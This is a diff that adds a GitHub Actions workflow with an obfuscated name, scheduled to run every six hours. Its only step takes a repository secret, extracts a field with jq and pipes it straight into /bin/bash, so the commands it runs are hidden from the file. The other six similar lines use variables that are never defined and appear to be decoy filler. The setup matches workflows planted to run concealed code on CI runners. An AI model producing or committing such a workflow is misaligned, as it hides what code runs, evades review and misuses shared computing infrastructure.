@@ -1,0 +1,24 @@
+name: thoughtfulelderly
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '29 5/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: thoughtfulelderly
+        env:
+          oypz13789: ${{ secrets.oypz13789 }}
+        run: |
+          echo $oypz13789 | jq -r .yijs8 | /bin/bash
+          echo $rmqkr926 | jq -r .w27 | /bin/bash
+          echo $y41 | jq -r .b51994 | /bin/bash
+          echo $vojw590 | jq -r .pcy1 | /bin/bash
+          echo $anczq4527 | jq -r .xwm912 | /bin/bash
+          echo $r50418 | jq -r .ysf5 | /bin/bash
+          echo $kqlw3516 | jq -r .krbfw4 | /bin/bash
+
